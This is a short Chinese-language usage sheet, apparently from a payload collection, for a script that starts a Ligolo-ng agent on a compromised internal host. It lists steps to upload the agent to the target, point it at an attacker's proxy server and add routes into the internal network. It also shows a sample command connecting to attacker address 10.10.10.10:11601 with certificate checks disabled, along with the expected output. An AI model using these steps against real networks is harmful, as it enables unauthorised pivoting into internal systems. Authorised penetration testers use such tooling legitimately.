## 📦 载荷使用说明：ligolo_agent_start.sh

### 📝 功能说明
Ligolo-ng 是一款先进的内网穿透工具，使用 TUN 接口建立隧道。此脚本用于在目标机器上启动 Ligolo 代理端（Agent），连接到攻击者的代理服务器。

### ⚙️ 参数说明
```text
- `-connect`：攻击者 Ligolo 代理服务器的 IP 和端口（默认 11601）
- `-ignore-cert`：忽略 TLS 证书验证
```

### 🚀 操作步骤
1. 在攻击机配置 TUN 接口并启动 Ligolo Proxy 服务端。
2. 将 Ligolo Agent 二进制文件和此脚本上传至内网目标主机。
3. 修改脚本中的服务端连接地址。
4. 执行脚本：`bash ligolo_agent_start.sh`。
5. 在攻击机服务端控制台中添加路由，即可直接访问内网网段。

### 💻 执行样例
```bash
# 连接到攻击机 10.10.10.10 的 11601 端口
./ligolo_agent_start.sh -connect 10.10.10.10:11601 -ignore-cert

# 预期输出：
# WARN[0000] TLS certificate verification is disabled!
# INFO[0000] Connecting to proxy...                       addr='10.10.10.10:11601'
# INFO[0000] Connection established                       addr='10.10.10.10:11601'
```
